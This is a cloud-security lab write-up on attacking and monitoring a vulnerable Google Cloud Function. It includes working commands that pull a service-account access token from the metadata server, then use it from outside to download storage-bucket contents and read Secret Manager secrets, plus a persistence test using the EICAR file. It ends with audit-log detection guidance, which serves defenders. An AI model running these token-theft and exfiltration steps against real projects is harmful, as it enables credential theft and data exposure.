# Google Cloud Platform

## Execution Environment

The container runs as root:

```
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

Exploring through the source code:

```
pwd
/workspace

ls -la
total 80
drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 .
drwxr-xr-x 7 root     root         0 Sep 29 17:42 ..
drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 .googlebuild
-rw-r--r-- 1 www-data www-data   270 Jan  1  1980 go.mod
-rw-r--r-- 1 www-data www-data 78994 Jan  1  1980 go.sum
-rw-r--r-- 1 www-data www-data  1893 Jan  1  1980 main.go
drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 serverless_function_source_code

ls -al /workspace/serverless_function_source_code
total 80
drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 .
drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 ..
-rwxr-xr-x 1 www-data www-data  4519 Jan  1  1980 cheetah.go
-rwxr-xr-x 1 www-data www-data   311 Jan  1  1980 cheetah.yaml
-rwxr-xr-x 1 www-data www-data   194 Jan  1  1980 go.mod
-rwxr-xr-x 1 www-data www-data 75588 Jan  1  1980 go.sum

cat /workspace/serverless_function_source_code/cheetah.yaml

# Server configurations
server:
  host: "10.42.42.42"
  port: 8000

# Database credentials
database:
  user: "cheetah_user"
  pass: "TmV2ZXIgcGxheSBwb2tlciB3aXRoIHRoZSB3b3JsZCdzIGZhc3Rlc3QgYW5pbWFsLCBiZWNhdXNlIGhlJ3MgYSBjaGVldGFoLiAtIGNvb2xmdW5ueXF1b3Rlcy5jb20g"

# Storage bucket
gcs:
  bucket: cheetah-abc123
```

```
cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.6 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.6 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
```

Writing to root file system works.

```
echo "test" > /root/test.txt
```

```
env
GCF_BLOCK_RUNTIME_nodejs6=410
K_REVISION=1
HOME=/root
PORT=8080
FUNCTION_SIGNATURE_TYPE=http
GCF_BLOCK_RUNTIME_go112=410
PATH=/layers/google.go.build/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
FUNCTION_TARGET=Cheetah
DEBIAN_FRONTEND=noninteractive
K_SERVICE=serverless-prey-cheetah-abc123
PWD=/workspace
```

## Metadata Endpoint

[App Engine Metadata Service](
https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata#making_metadata_requests)

Querying the service account for interesting bits of information:

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

<account-email>@developer.gserviceaccount.com

```

Querying for the default aliases:

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases

default
```

Querying for the default service accounts for the execution role:

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/

aliases
email
identity
scopes
token
```

Querying the metadata service for the valid scopes. Wow, this is an insane amount of scopes available by default:

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes


https://mail.google.com/
https://www.googleapis.com/auth/analytics
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/contacts
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/presentations
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/streetviewpublish
https://www.googleapis.com/auth/urlshortener
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/youtube

```

Querying the service account authentication token, which appears to be valid for 30 minutes.

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

{"access_token":"ya29.c.KqUBuAfh01CzhYCWOdbI9m9hx3pObivDuYw6WER2X06r7lB60Biyl8Ur0E-78riuHZa47yqriWSL2fJOZ8CJC6D_F9q6bxun1BE72HnWhuzo_KI43DRj-J60R4fd_vKHQxoQa3rsWEZbfGgH3akYP7aXzJiI29M_0THL6dt74J8Yme3L9-HgLgHWx3gA9q0IACAS7_WZLwcCtSRxZBh","expires_in":1676,"token_type":"Bearer"}
```

## Token Pivoting

At the time of this writing, I have not found a way to load up the OAuth access token and use it from the `gcloud` command line interface. This overall makes it harder to run commands against the account, but can still be done directly against the API using a proxy tool, Burp, or by using the SDK from a script (Python, Java, .NET, etc.).

Set the *access_token* and project environment variables locally using the values obtained from the function execution environment.

```bash
export GCP_TOKEN=<INSERT ACCESS TOKEN>
export GCP_PROJECT=<GOOGLE PROJECT>
export GCP_SECRET=<SECRET ID>
export GCP_BUCKET=<BUCKET NAME>
```

TODO: Write a bucket exfiltration script to do the following for us for all buckets and all items in the project. See the [Cloud Storage JSON API](https://cloud.google.com/storage/docs/json_api/) for details.

List the buckets for the project and query the first bucket:

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GCP_PROJECT" | jq '.items[0].selfLink'
```

List the objects in the storage bucket

```bash
export GCP_PROJECT_BUCKET=$(curl -s -H "Authorization: Bearer $GCP_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GCP_PROJECT" | jq -r '.items[0].selfLink')
curl -s -H "Authorization: Bearer $GCP_TOKEN" "$GCP_PROJECT_BUCKET/o"
```

Get the object (including metadata) from the bucket

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" "https://storage.googleapis.com/storage/v1/b/$GCP_BUCKET/o/cheetah.jpg"
```

Download the object from the bucket:

```bash
export GOOGLE_BUCKET_ITEM=$(curl -s -H "Authorization: Bearer $GCP_TOKEN" "$GCP_PROJECT_BUCKET/o" | jq -r '.items[0].selfLink')
curl -s -H "Authorization: Bearer $GCP_TOKEN" "$GOOGLE_BUCKET_ITEM?alt=media" --output ~/Downloads/cheetah.jpg
```

At the time of this writing, the secrets manager appears to still be in Beta. See the [API Reference](https://cloud.google.com/secret-manager/docs/reference/rest/v1beta1/projects.secrets) for details on accessing the API. List the secrets in the project:

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GCP_PROJECT/secrets
```

It appears this is not included the default editor role permissions. You have to explicitly grant the service account the "Secret Manager Secret Accessor" (secretmanager.versions.access) role to view the secret value. Then, running the command returns the following:


```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GCP_PROJECT/secrets/$GCP_SECRET/versions/latest:access

{
  "name": "projects/123/secrets/cheetah-database-pass/versions/1",
  "payload": {
    "data": "UW5WMElIVnVhV052Y201eklHRndjR0Z5Wlc1MGJIa2daRzhnWlhocGMzUXU="
  }
}
```

## Persistence

Persisting a malware payload into the runtime environment. Unlike AWS, some directories other than `/tmp` are writable while the source directory is not:

```
mount

none on / type overlayfs (rw)
none on /dev type overlayfs (rw)
none on /proc type proc (rw)
none on /sys type sysfs (rw)
none on /tmp type tmpfs (rw)
none on /cloudsql type 9p (rw)
none on /var/log type overlayfs (rw)

echo "Malware" > /srv/files/malware.sh

/bin/sh: 9: cannot create /srv/files/malware.sh: Read-only file system

echo "Malware" > /root/malware.sh
ls /root/malware.sh

/root/malware.sh

echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > /root/malware.sh
cat /root/malware.sh

X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 1 minute:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 2 minutes:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 3 minutes:

cat /tmp/malware.sh
cat: /tmp/malware.sh: No such file or directory

## Monitoring &amp; Incident Response

See the [Cloud Functions Monitoring](https://cloud.google.com/functions/docs/monitoring/) documents for details.

Stackdriver services captures and stores function logs, error reporting, and records metrics. The Stackdriver GUI is (surprise) in beta at the time of this writing.

Instrumenting the function with audit logging statements, such as follows will write logs to the Stackdriver Logging service.

### Cloud Audit

- Head to the IAM Audit Logs service. Enable admin and data logging. This can be global, or by service. Then, you'll get audit data for API calls.

- Invoke Cheetah to cause **normal** behavior.

- Stackdriver is the log viewer that will allow you to see the normal activity versus malicious activity.

  - In the log dropdown, selected Audited Resources

  - Start searching for the log files for **Secret Manager** **AccessSecretVersion** calls. You should find a log entry similar to the following:

      ```json
      {
        insertId: "suvz8ge1dkpo"  
        logName: "projects/google-project-id/logs/cloudaudit.googleapis.com%2Fdata_access"  
        protoPayload: {
          @type: "type.googleapis.com/google.cloud.audit.AuditLog"
          authenticationInfo: {
          principalEmail: "123456789012-compute@developer.gserviceaccount.com"
          principalSubject: "user:123456789012-compute@developer.gserviceaccount.com"
          }
          authorizationInfo: [
          0: {
            granted: true
            permission: "secretmanager.versions.access"
            resourceAttributes: {
            }
          }
          ]
          methodName: "google.cloud.secrets.v1beta1.SecretManagerService.AccessSecretVersion"
          request: {
          @type: "type.googleapis.com/google.cloud.secrets.v1beta1.AccessSecretVersionRequest"
          name: "projects/google-project-id/secrets/cheetah-database-pass/versions/latest"
          }
          requestMetadata: {
            callerIp: "2600:1900:2000:38:400::13"
            callerSuppliedUserAgent: "grpc-go/1.26.0,gzip(gfe),gzip(gfe)"
            destinationAttributes: {
          }
          requestAttributes: {
            auth: {
            }
            time: "2020-01-09T23:55:02.888841562Z"
          }
          }
          resourceName: "projects/123456789012/secrets/cheetah-database-pass/versions/latest"
          serviceName: "secretmanager.googleapis.com"
        }
        receiveTimestamp: "2020-01-09T23:55:03.543549591Z"  
        resource: {
          labels: {
          method: "google.cloud.secrets.v1beta1.SecretManagerService.AccessSecretVersion"
          project_id: "google-project-id"
          service: "secretmanager.googleapis.com"
          }
          type: "audited_resource"
        }
        severity: "INFO"  
        timestamp: "2020-01-09T23:55:02.882192620Z"  
      }
      ```

  - Notice the user account is the function service account and request metadata from inside the platform infrastructure:

    ```json
    principalSubject: "user:123456789012-compute@developer.gserviceaccount.com"
    ```

    ```json
    requestMetadata: {
          callerIp: "2600:1900:2000:38:400::13"
          callerSuppliedUserAgent: "grpc-go/1.26.0,gzip(gfe),gzip(gfe)"
          ...
    }
    ```

- Replay the above **Token Pivoting** attack, extracting the auth token from the function, and dumping the secret from your attack machine.

- Search the Stackdriver logs again. Notice this new malicious log entry. Same user account, except not coming from the Go GRPC package. This time from curl and from a different (non-IPv6) address:

  ```json
  {
    insertId: "1d4dg1pd50ae"  
    logName: "projects/google-project-id/logs/cloudaudit.googleapis.com%2Fdata_access"  
    protoPayload: {
      @type: "type.googleapis.com/google.cloud.audit.AuditLog"
      authenticationInfo: {
      principalEmail: "123456789012-compute@developer.gserviceaccount.com"
      principalSubject: "user:123456789012-compute@developer.gserviceaccount.com"
      }
      authorizationInfo: [1]
      methodName: "google.cloud.secrets.v1beta1.SecretManagerService.AccessSecretVersion"
      request: {…}
      requestMetadata: {
        callerIp: "95.025.143.109"
        callerSuppliedUserAgent: "curl/7.64.1,gzip(gfe),gzip(gfe)"
        destinationAttributes: {…}
        requestAttributes: {…}
      }
      resourceName: "projects/123456789012/secrets/cheetah-database-pass/versions/latest"
      serviceName: "secretmanager.googleapis.com"
    }
    receiveTimestamp: "2020-01-10T20:30:00.403050477Z"  
    resource: {…}  
    severity: "INFO"  
    timestamp: "2020-01-10T20:30:00.192825193Z"
  }
  ```

- For whats it's worth, this anomaly is not detected by the **Security Command Center** threat detection or anomaly detection rules.

## VPC Configuration

Attempted this in the Web UI. Crashed...

### VPC Endpoints

Unable to configure this due to the error connecting the function to a VPC network interface.

## Cold Start Times

Running the following command a few times to see the cold versus warm start metrics. This will invoke the function without any reverse shell data (simulating starting and stopping the function), and retrieve the response time.

```bash
curl "http://$GCP_REGION-YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID.cloudfunctions.net/Cheetah" -s -o /dev/null -w "%{time_starttransfer}\n"
```

### No VPC Integration

Cold to warm metrics:

```
Request 1: 2.730960
Request 2: 0.504486
Request 3: 0.464685
Request 4: 0.531443
```

### With VPC Integration

Unable to test due to the configuration error above.
